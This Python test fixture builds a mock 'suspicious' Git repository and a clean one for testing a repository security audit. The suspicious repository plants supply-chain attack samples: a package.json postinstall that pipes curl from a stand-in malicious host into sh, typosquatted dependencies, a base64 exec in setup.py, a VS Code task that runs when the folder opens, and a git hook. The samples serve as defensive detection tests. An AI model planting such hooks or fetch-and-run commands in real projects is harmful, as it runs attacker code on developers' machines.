import os
import shutil
import subprocess
from pathlib import Path
from typing import Dict, Any


def create_mock_audit_repos(base_dir: str = "/tmp/ai_os_audit_test") -> Dict[str, str]:
    """Create deterministic mock Git repositories for security audit verification.

    Initializes mock_suspicious_repo and mock_clean_repo complete with git commits
    for deterministic offline testing across phases 6.1 through 6.6.
    """
    base_path = Path(base_dir).resolve()
    base_path.mkdir(parents=True, exist_ok=True)

    suspicious_dir = base_path / "mock_suspicious_repo"
    clean_dir = base_path / "mock_clean_repo"

    _setup_mock_suspicious_repo(suspicious_dir)
    _setup_mock_clean_repo(clean_dir)

    return {
        "base_dir": str(base_path),
        "mock_suspicious_repo": str(suspicious_dir),
        "mock_clean_repo": str(clean_dir),
    }


def _setup_mock_suspicious_repo(target_dir: Path) -> None:
    """Populate and initialize mock_suspicious_repo with suspicious patterns and synthetic payloads."""
    if target_dir.exists():
        shutil.rmtree(target_dir, ignore_errors=True)
    target_dir.mkdir(parents=True, exist_ok=True)

    # 1. package.json with postinstall script and typosquatted dependency
    package_json = target_dir / "package.json"
    package_json.write_text(
        '{\n'
        '  "name": "mock-suspicious-repo",\n'
        '  "version": "1.0.0",\n'
        '  "scripts": {\n'
        '    "postinstall": "curl -s http://malicious-test.invalid/payload.sh | sh"\n'
        '  },\n'
        '  "dependencies": {\n'
        '    "reqeusts": "^2.28.0"\n'
        '  }\n'
        '}\n',
        encoding="utf-8",
    )

    # 2. requirements.txt with typosquatted package and direct tarball URL
    requirements_txt = target_dir / "requirements.txt"
    requirements_txt.write_text(
        "reqeusts==2.28.0\n"
        "urllib3==1.26.0\n"
        "http://untrusted-host.invalid/evil_pkg-0.1.tar.gz\n",
        encoding="utf-8",
    )

    # 3. setup.py with base64 encoded exec and subprocess shell=True
    setup_py = target_dir / "setup.py"
    setup_py.write_text(
        'import base64\n'
        'import subprocess\n'
        'from setuptools import setup\n\n'
        'payload = "cHJpbnQoJ2hlbGxvIHdvcmxkJyk="\n'
        'exec(base64.b64decode(payload).decode("utf-8"))\n'
        'subprocess.Popen("echo test", shell=True)\n\n'
        'setup(\n'
        '    name="mock-suspicious-pkg",\n'
        '    version="0.1.0",\n'
        ')\n',
        encoding="utf-8",
    )

    # 4. .vscode/tasks.json with auto-run on folderOpen
    vscode_dir = target_dir / ".vscode"
    vscode_dir.mkdir(parents=True, exist_ok=True)
    tasks_json = vscode_dir / "tasks.json"
    tasks_json.write_text(
        '{\n'
        '  "version": "2.0.0",\n'
        '  "tasks": [\n'
        '    {\n'
        '      "label": "AutoRunTask",\n'
        '      "type": "shell",\n'
        '      "command": "echo test",\n'
        '      "runOptions": {\n'
        '        "runOn": "folderOpen"\n'
        '      }\n'
        '    }\n'
        '  ]\n'
        '}\n',
        encoding="utf-8",
    )

    # 5. assets/updater.dat with 4-byte ELF magic header
    assets_dir = target_dir / "assets"
    assets_dir.mkdir(parents=True, exist_ok=True)
    updater_dat = assets_dir / "updater.dat"
    updater_dat.write_bytes(b"\x7fELF" + b"DUMMY_TEST_BINARY_PAYLOAD")

    # Initialize Git repository and commit
    _init_git_repository(target_dir, "Initial commit for suspicious test repo")

    # Install post-checkout hook to verify hooks are bypassed during safe clone
    hooks_dir = target_dir / ".git" / "hooks"
    if hooks_dir.exists():
        hook_script = hooks_dir / "post-checkout"
        hook_script.write_text(
            '#!/bin/sh\necho "HOOK_EXECUTED" > /tmp/ai_os_audit_hook_marker.txt\n',
            encoding="utf-8",
        )
        hook_script.chmod(0o755)


def _setup_mock_clean_repo(target_dir: Path) -> None:
    """Populate and initialize mock_clean_repo with clean, standard code."""
    if target_dir.exists():
        shutil.rmtree(target_dir, ignore_errors=True)
    target_dir.mkdir(parents=True, exist_ok=True)

    # 1. main.py with clean calculation functions
    main_py = target_dir / "main.py"
    main_py.write_text(
        'def calculate_sum(a: int, b: int) -> int:\n'
        '    """Calculate the sum of two integers."""\n'
        '    return a + b\n\n\n'
        'def calculate_product(a: int, b: int) -> int:\n'
        '    """Calculate the product of two integers."""\n'
        '    return a * b\n\n\n'
        'if __name__ == "__main__":\n'
        '    print(f"Sum: {calculate_sum(5, 7)}")\n',
        encoding="utf-8",
    )

    # 2. utils.py with standard socket connection test stub
    utils_py = target_dir / "utils.py"
    utils_py.write_text(
        'import socket\n\n\n'
        'def check_server_connection(host: str = "127.0.0.1", port: int = 8000) -> bool:\n'
        '    """Check socket connectivity to a local test host."""\n'
        '    try:\n'
        '        with socket.create_connection((host, port), timeout=2):\n'
        '            return True\n'
        '    except (socket.timeout, OSError):\n'
        '        return False\n',
        encoding="utf-8",
    )

    # 3. requirements.txt with standard packages
    requirements_txt = target_dir / "requirements.txt"
    requirements_txt.write_text(
        "pydantic==2.7.0\n"
        "fastapi==0.110.0\n",
        encoding="utf-8",
    )

    # Initialize Git repository and commit
    _init_git_repository(target_dir, "Initial commit for clean test repo")


def _init_git_repository(repo_path: Path, commit_msg: str) -> None:
    """Initialize a Git repository and create an initial commit."""
    subprocess.run(["git", "init"], cwd=str(repo_path), check=True, capture_output=True)
    subprocess.run(
        ["git", "config", "user.email", "test@example.com"],
        cwd=str(repo_path),
        check=True,
        capture_output=True,
    )
    subprocess.run(
        ["git", "config", "user.name", "Test Auditor"],
        cwd=str(repo_path),
        check=True,
        capture_output=True,
    )
    subprocess.run(["git", "add", "."], cwd=str(repo_path), check=True, capture_output=True)
    subprocess.run(
        ["git", "commit", "-m", commit_msg],
        cwd=str(repo_path),
        check=True,
        capture_output=True,
    )
